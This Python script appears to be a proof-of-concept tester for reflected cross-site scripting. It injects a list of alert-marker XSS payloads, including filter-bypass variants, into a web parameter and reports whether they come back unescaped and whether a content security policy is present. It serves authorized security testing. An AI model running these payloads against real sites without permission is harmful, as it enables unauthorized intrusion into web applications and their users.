#!/usr/bin/env python3
"""
PoC: Cross-Site Scripting (XSS) - VULN-XSS-001

Vulnerability:
    Cross-Site Scripting (XSS) occurs when an application includes untrusted
    data in its HTML output without proper sanitization or encoding. This
    allows attackers to inject malicious scripts that execute in victims'
    browsers, leading to session hijacking, credential theft, defacement,
    and phishing attacks.

    This PoC tests for Reflected XSS by injecting various payloads into
    parameters and checking if they appear unescaped in the response HTML.

Test methodology:
    1. Send baseline request to confirm the endpoint is reachable.
    2. Inject multiple XSS payloads (script tags, event handlers, SVG, etc.).
    3. Check if the payload appears UNESCAPED in the response body.
    4. Verify the response Content-Type is text/html (XSS requires HTML context).
    5. Check for absence of Content Security Policy (CSP) headers.

Usage:
    python poc_xss_001.py --target http://localhost:8080 \\
        --endpoint "/search" --param "q"

Exit codes:
    0 = CONFIRMED  (unescaped payload reflected in HTML response)
    1 = NOT_REPRODUCED  (all payloads were escaped or blocked)
    2 = ERROR  (script encountered an error)

AUTHORIZED SECURITY TESTING ONLY.
"""

import argparse
import html
import re
import sys
import time
import uuid

try:
    import requests
    _HAS_REQUESTS = True
except ImportError:
    _HAS_REQUESTS = False


# ---------------------------------------------------------------------------
# XSS Payloads
# ---------------------------------------------------------------------------

def generate_payloads(marker):
    """
    Generate a list of XSS payloads, each tagged with a unique marker for
    identification. Returns list of (name, payload, detection_pattern) tuples.

    The detection_pattern is what we look for in the response to confirm
    the payload was reflected without encoding.
    """
    return [
        (
            "Basic script tag",
            f'<script>alert("{marker}")</script>',
            f'<script>alert("{marker}")</script>',
        ),
        (
            "IMG onerror event handler",
            f'<img src=x onerror=alert("{marker}")>',
            f'onerror=alert("{marker}")',
        ),
        (
            "SVG onload event handler",
            f'<svg onload=alert("{marker}")>',
            f'<svg onload=alert("{marker}")>',
        ),
        (
            "Body onload event handler",
            f'<body onload=alert("{marker}")>',
            f'onload=alert("{marker}")',
        ),
        (
            "Event handler in DIV",
            f'<div onmouseover=alert("{marker}")>hover</div>',
            f'onmouseover=alert("{marker}")',
        ),
        (
            "JavaScript URI in anchor",
            f'<a href="javascript:alert(\'{marker}\')">click</a>',
            f'javascript:alert(\'{marker}\')',
        ),
        (
            "Input autofocus onfocus",
            f'<input autofocus onfocus=alert("{marker}")>',
            f'onfocus=alert("{marker}")',
        ),
        (
            "Details tag ontoggle",
            f'<details open ontoggle=alert("{marker}")>',
            f'ontoggle=alert("{marker}")',
        ),
        (
            "Script tag with src",
            f'<script src="data:text/javascript,alert(\'{marker}\')"></script>',
            f'<script src="data:text/javascript',
        ),
        (
            "Encoded angle brackets (double encoding)",
            f'%253Cscript%253Ealert("{marker}")%253C/script%253E',
            f'<script>alert("{marker}")</script>',
        ),
        (
            "Case variation",
            f'<ScRiPt>alert("{marker}")</ScRiPt>',
            f'<ScRiPt>alert("{marker}")',
        ),
        (
            "Null byte bypass",
            f'<scr\x00ipt>alert("{marker}")</script>',
            f'alert("{marker}")',
        ),
    ]


# ---------------------------------------------------------------------------
# Detection helpers
# ---------------------------------------------------------------------------

def is_html_response(response):
    """Check if the response Content-Type indicates HTML."""
    ct = response.headers.get("Content-Type", "").lower()
    return "text/html" in ct or "application/xhtml" in ct


def get_csp_info(response):
    """Extract CSP header information from the response."""
    csp = response.headers.get("Content-Security-Policy", "")
    csp_ro = response.headers.get("Content-Security-Policy-Report-Only", "")
    x_csp = response.headers.get("X-Content-Security-Policy", "")  # Legacy

    headers_found = {}
    if csp:
        headers_found["Content-Security-Policy"] = csp
    if csp_ro:
        headers_found["Content-Security-Policy-Report-Only"] = csp_ro
    if x_csp:
        headers_found["X-Content-Security-Policy"] = x_csp

    return headers_found


def has_effective_csp(csp_headers):
    """
    Check if CSP headers would block inline script execution.
    Returns True if CSP appears to block inline scripts.
    """
    for header_name, header_value in csp_headers.items():
        if header_name == "Content-Security-Policy-Report-Only":
            continue  # Report-only doesn't block

        value_lower = header_value.lower()
        # Check for script-src directive
        if "script-src" in value_lower:
            # If 'unsafe-inline' is NOT present, inline scripts are blocked
            if "'unsafe-inline'" not in value_lower:
                return True
        elif "default-src" in value_lower:
            # default-src applies if script-src is absent
            if "'unsafe-inline'" not in value_lower:
                return True

    return False


def payload_reflected_unescaped(response_body, detection_pattern):
    """
    Check if the detection pattern appears unescaped in the response.
    We verify it's not in an HTML-encoded form.
    """
    if detection_pattern in response_body:
        # Verify this isn't just the HTML-encoded version
        encoded = html.escape(detection_pattern)
        if encoded != detection_pattern and encoded in response_body:
            # The encoded version is present; check if unencoded is also present
            # by looking for the pattern outside encoded contexts
            pass
        return True
    return False


def check_reflection_context(response_body, detection_pattern):
    """
    Determine the HTML context where the payload was reflected.
    Returns a description of the context.
    """
    idx = response_body.find(detection_pattern)
    if idx == -1:
        return None

    # Get surrounding context (200 chars before and after)
    start = max(0, idx - 200)
    end = min(len(response_body), idx + len(detection_pattern) + 200)
    context = response_body[start:end]

    # Check if inside a script block
    if re.search(r"<script[^>]*>", context[:200], re.IGNORECASE):
        return "inside <script> block"

    # Check if inside an HTML attribute
    attr_match = re.search(r'=\s*["\']?[^"\']*$', context[:200])
    if attr_match:
        return "inside HTML attribute"

    # Check if inside HTML tag
    tag_match = re.search(r"<\w+[^>]*$", context[:200])
    if tag_match:
        return "inside HTML tag"

    return "in HTML body"


# ---------------------------------------------------------------------------
# Arguments
# ---------------------------------------------------------------------------

def parse_args():
    parser = argparse.ArgumentParser(
        description="PoC for Cross-Site Scripting / XSS (VULN-XSS-001)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="AUTHORIZED SECURITY TESTING ONLY.",
    )
    parser.add_argument(
        "--target",
        default="http://localhost:8080",
        help="Base URL of the target application (default: http://localhost:8080)",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=30,
        help="Request timeout in seconds (default: 30)",
    )
    parser.add_argument(
        "--endpoint",
        default="/search",
        help="Target endpoint to test (default: /search)",
    )
    parser.add_argument(
        "--param",
        default="q",
        help="Parameter name to inject payloads into (default: q)",
    )
    parser.add_argument(
        "--method",
        choices=["get", "post"],
        default="get",
        help="HTTP method (default: get)",
    )
    parser.add_argument(
        "--additional-params",
        default=None,
        help="Additional parameters as key=value pairs separated by '&'",
    )
    parser.add_argument(
        "--cookie",
        default=None,
        help="Session cookie to include (e.g., 'session=abc123')",
    )
    parser.add_argument(
        "--auth-header",
        default=None,
        help="Authorization header value (e.g., 'Bearer token123')",
    )
    return parser.parse_args()


# ---------------------------------------------------------------------------
# Core test
# ---------------------------------------------------------------------------

def build_params(args, payload):
    """Build request parameters including the payload and any additional params."""
    params = {args.param: payload}

    if args.additional_params:
        for pair in args.additional_params.split("&"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                params[k.strip()] = v.strip()

    return params


def build_headers(args):
    """Build request headers."""
    headers = {
        "User-Agent": "VulnAnalysis-PoC/1.0",
        "Accept": "text/html,application/xhtml+xml,*/*",
    }
    if args.cookie:
        headers["Cookie"] = args.cookie
    if args.auth_header:
        headers["Authorization"] = args.auth_header
    return headers


def send_payload(args, payload):
    """Send a single payload and return the response."""
    url = f"{args.target.rstrip('/')}{args.endpoint}"
    headers = build_headers(args)
    params = build_params(args, payload)

    if args.method == "get":
        return requests.get(
            url, params=params, headers=headers,
            timeout=args.timeout, allow_redirects=True
        )
    else:
        return requests.post(
            url, data=params, headers=headers,
            timeout=args.timeout, allow_redirects=True
        )


def test_xss(args):
    """
    Execute the full XSS test suite.

    Returns:
        tuple: (exit_code, result_message)
    """
    vuln_id = "VULN-XSS-001"
    target = args.target.rstrip("/")
    marker = uuid.uuid4().hex[:12]

    # -------------------------------------------------------------------------
    # Step 1: Baseline connectivity check
    # -------------------------------------------------------------------------
    print("[*] Step 1: Connectivity check...")

    try:
        baseline_resp = send_payload(args, "testvalue123")
    except requests.ConnectionError as exc:
        return 2, f"[ERROR] {vuln_id}: Connection failed to {target} - {exc}"
    except requests.Timeout:
        return 2, f"[ERROR] {vuln_id}: Request timed out after {args.timeout}s"
    except requests.RequestException as exc:
        return 2, f"[ERROR] {vuln_id}: Request error - {exc}"

    print(f"    Status: HTTP {baseline_resp.status_code}")
    print(f"    Content-Type: {baseline_resp.headers.get('Content-Type', 'not set')}")
    print(f"    Response size: {len(baseline_resp.text)} bytes")

    if baseline_resp.status_code not in (200, 301, 302, 303, 307, 308):
        return 2, (
            f"[ERROR] {vuln_id}: Endpoint returned HTTP {baseline_resp.status_code}. "
            f"Verify the endpoint is correct."
        )

    # Check Content-Type
    content_type_is_html = is_html_response(baseline_resp)
    if not content_type_is_html:
        print(f"    WARNING: Content-Type is not text/html. XSS impact may be limited.")

    # Check CSP
    csp_headers = get_csp_info(baseline_resp)
    csp_blocks_inline = False
    if csp_headers:
        print(f"    CSP headers detected:")
        for name, value in csp_headers.items():
            print(f"      {name}: {value[:100]}{'...' if len(value) > 100 else ''}")
        csp_blocks_inline = has_effective_csp(csp_headers)
        if csp_blocks_inline:
            print(f"    NOTE: CSP appears to block inline script execution.")
    else:
        print(f"    No CSP headers detected (increases XSS impact).")

    # Check other security headers
    x_xss = baseline_resp.headers.get("X-XSS-Protection", "")
    if x_xss:
        print(f"    X-XSS-Protection: {x_xss}")

    # -------------------------------------------------------------------------
    # Step 2: Inject XSS payloads
    # -------------------------------------------------------------------------
    print(f"\n[*] Step 2: Testing XSS payloads (marker: {marker})...")

    payloads = generate_payloads(marker)
    confirmed_payloads = []
    partial_payloads = []

    for name, payload, detection_pattern in payloads:
        print(f"\n  --- {name} ---")
        print(f"    Payload: {payload[:80]}{'...' if len(payload) > 80 else ''}")

        try:
            resp = send_payload(args, payload)
        except requests.Timeout:
            print(f"    Timed out - skipping")
            continue
        except requests.RequestException as exc:
            print(f"    Request error: {exc} - skipping")
            continue

        print(f"    Response: HTTP {resp.status_code}, {len(resp.text)} bytes")

        if resp.status_code != 200:
            print(f"    Non-200 status, skipping analysis.")
            continue

        # Check if payload is reflected unescaped
        reflected = payload_reflected_unescaped(resp.text, detection_pattern)
        resp_is_html = is_html_response(resp)

        if reflected:
            context = check_reflection_context(resp.text, detection_pattern)
            print(f"    REFLECTED UNESCAPED! Context: {context}")

            if resp_is_html:
                resp_csp = get_csp_info(resp)
                resp_csp_blocks = has_effective_csp(resp_csp)

                confirmed_payloads.append({
                    "name": name,
                    "payload": payload,
                    "context": context,
                    "csp_blocks": resp_csp_blocks,
                    "content_type_html": True,
                })
                print(f"    -> CONFIRMED: Unescaped reflection in HTML response")
                if resp_csp_blocks:
                    print(f"    -> NOTE: CSP may mitigate execution, but injection exists")
            else:
                partial_payloads.append({
                    "name": name,
                    "payload": payload,
                    "context": context,
                    "reason": f"Content-Type is not HTML ({resp.headers.get('Content-Type', 'unknown')})",
                })
                print(f"    -> PARTIAL: Reflected but Content-Type is not text/html")
        else:
            # Check if payload was HTML-encoded (proper defense)
            encoded_pattern = html.escape(detection_pattern)
            if encoded_pattern in resp.text and encoded_pattern != detection_pattern:
                print(f"    Properly HTML-encoded in response (safe)")
            elif marker in resp.text:
                print(f"    Marker present but payload structure was sanitized")
            else:
                print(f"    Payload not reflected in response")

    # -------------------------------------------------------------------------
    # Step 3: Results
    # -------------------------------------------------------------------------
    print(f"\n[*] Step 3: Analysis complete.")

    if confirmed_payloads:
        # Separate fully exploitable from CSP-mitigated
        fully_exploitable = [p for p in confirmed_payloads if not p["csp_blocks"]]
        csp_mitigated = [p for p in confirmed_payloads if p["csp_blocks"]]

        if fully_exploitable:
            names = ", ".join(p["name"] for p in fully_exploitable)
            return 0, (
                f"[CONFIRMED] {vuln_id}: Reflected XSS confirmed. "
                f"{len(fully_exploitable)} payload(s) reflected unescaped in HTML "
                f"without effective CSP: {names}."
            )
        elif csp_mitigated:
            names = ", ".join(p["name"] for p in csp_mitigated)
            return 0, (
                f"[CONFIRMED] {vuln_id}: XSS injection confirmed but CSP may "
                f"mitigate execution. {len(csp_mitigated)} payload(s) reflected "
                f"unescaped: {names}. CSP bypass should be investigated."
            )

    if partial_payloads:
        names = ", ".join(p["name"] for p in partial_payloads)
        return 1, (
            f"[PARTIAL] {vuln_id}: Payloads reflected unescaped but not in HTML "
            f"context. {len(partial_payloads)} partial match(es): {names}. "
            f"Manual review recommended."
        )

    return 1, (
        f"[NOT_REPRODUCED] {vuln_id}: All {len(payloads)} XSS payloads were "
        f"either escaped, sanitized, or not reflected in the response."
    )


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    args = parse_args()
    vuln_id = "VULN-XSS-001"

    if not _HAS_REQUESTS:
        print("[ERROR] VULN-XSS-001: 'requests' library is required. "
              "Install with: pip install requests")
        sys.exit(2)

    print("=" * 70)
    print("  PoC: Cross-Site Scripting (XSS)")
    print(f"  Vulnerability ID: {vuln_id}")
    print("=" * 70)
    print(f"  Target:    {args.target}")
    print(f"  Endpoint:  {args.endpoint}")
    print(f"  Parameter: {args.param}")
    print(f"  Method:    {args.method.upper()}")
    print(f"  Timeout:   {args.timeout}s")
    print("=" * 70)
    print()

    start_time = time.monotonic()

    try:
        exit_code, message = test_xss(args)
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
        sys.exit(2)
    except Exception as exc:
        print(f"\n[ERROR] {vuln_id}: Unexpected error - {exc}")
        sys.exit(2)

    elapsed = time.monotonic() - start_time

    print()
    print("-" * 70)
    print(f"  Result:  {message}")
    print(f"  Elapsed: {elapsed:.2f}s")
    print("-" * 70)

    sys.exit(exit_code)


if __name__ == "__main__":
    main()
